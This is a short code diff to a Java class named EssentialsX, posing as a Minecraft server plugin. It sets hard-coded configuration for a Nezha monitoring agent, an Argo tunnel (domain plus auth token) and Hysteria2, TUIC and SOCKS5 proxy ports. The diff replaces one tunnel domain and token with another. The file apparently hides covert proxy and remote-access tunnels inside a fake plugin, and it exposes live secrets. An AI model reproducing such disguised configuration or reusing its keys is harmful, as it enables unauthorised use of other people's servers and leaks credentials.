@@ -79,8 +79,8 @@ public class EssentialsX extends JavaPlugin {
         env.put("NEZHA_PORT", "");
         env.put("NEZHA_KEY", "yZAEKJz2Skx8a1ovsIFNVG7hd81n2BpD");
         env.put("ARGO_PORT", "42619");
-        env.put("ARGO_DOMAIN", "magmanode.xu88.pp.ua");
-        env.put("ARGO_AUTH", "eyJhIjoiOTU4MWYzZmNhMDgwMjgxMTgzMmEzNTNhYmY1OGM2MjMiLCJ0IjoiMjQyYTBlY2QtYzU2MC00NTE3LWFhYWQtMTQxMGExYWI5YjgzIiwicyI6IllqQXpaalJoTm1VdE16Tm1aQzAwTVRSaUxXSTNORE10WkdGbU5EbGlZamc0WmpFMSJ9");
+        env.put("ARGO_DOMAIN", "minerack.bo33.qzz.io");
+        env.put("ARGO_AUTH", "eyJhIjoiOTU4MWYzZmNhMDgwMjgxMTgzMmEzNTNhYmY1OGM2MjMiLCJ0IjoiYTgyZmQ5ZWYtNzhkOS00MWVmLTk0YjItYWIzNzU0OTA3N2ZhIiwicyI6IlptWmxNelk1WVRFdE1EaGtOaTAwT1dNNExUa3pZekV0TnpSa1ltTmxNREJoTkdSayJ9");
         env.put("S5_PORT", "");
         env.put("HY2_PORT", "25669");
         env.put("TUIC_PORT", "");
